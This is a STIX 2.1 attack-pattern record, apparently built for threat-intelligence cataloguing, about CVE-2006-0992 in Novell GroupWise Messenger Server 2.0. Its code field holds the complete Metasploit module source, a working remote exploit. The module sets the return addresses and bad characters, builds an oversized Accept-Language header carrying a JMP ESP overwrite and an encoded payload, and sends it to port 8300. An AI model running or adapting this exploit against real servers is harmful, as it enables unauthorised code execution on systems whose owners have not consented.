{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb31edd9-b92b-4c37-987d-dec209430a37",
    "created": "2024-08-14T16:53:45.028015Z",
    "modified": "2024-08-14T16:53:45.028019Z",
    "name": "Novell Messenger Server 2.0 Accept-Language Overflow",
    "description": " This module exploits a stack buffer overflow in Novell GroupWise Messenger Server v2.0. This flaw is triggered by any HTTP request with an Accept-Language header greater than 16 bytes. To overwrite the return address on the stack, we must first pass a memcpy() operation that uses pointers we supply. Due to the large list of restricted characters and the limitations of the current encoder modules, very few payloads are usable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/novell_messenger_acceptlang.rb",
            "external_id": "novell_messenger_acceptlang.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0992"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell Messenger Server 2.0 Accept-Language Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Novell GroupWise\n        Messenger Server v2.0. This flaw is triggered by any HTTP\n        request with an Accept-Language header greater than 16 bytes.\n        To overwrite the return address on the stack, we must first\n        pass a memcpy() operation that uses pointers we supply. Due to the\n        large list of restricted characters and the limitations of the current\n        encoder modules, very few payloads are usable.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2006-0992'],\n          ['OSVDB', '24617'],\n          ['BID', '17503'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'           => 500,\n          'BadChars'        => \"\\x00\\x0a\\x2c\\x3b\"+ [*(\"A\"..\"Z\")].join,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Groupwise Messenger DClient.dll v10510.37', { 'Rets' =>  [0x6103c3d3, 0x61041010] }],\n        ],\n      'DisclosureDate' => '2006-04-13'))\n\n    register_options( [ Opt::RPORT(8300) ])\n  end\n\n  def exploit\n    connect\n\n    lang = rand_text_alphanumeric(1900)\n    lang[ 16, 4] = [target['Rets'][1]].pack('V') # SRC\n    lang[272, 4] = [target['Rets'][1]].pack('V') # DST\n    lang[264, 4] = [target['Rets'][0]].pack('V') # JMP ESP\n    lang[268, 2] = \"\\xeb\\x06\"\n    lang[276, payload.encoded.length] = payload.encoded\n\n    res = \"GET / HTTP/1.1\\r\\nAccept-Language: #{lang}\\r\\n\\r\\n\"\n\n    print_status(\"Trying target address 0x%.8x...\" % target['Rets'][0])\n    sock.put(res)\n    sock.close\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-04-13",
    "x_mitre_platforms": [
        "win'"
    ]
}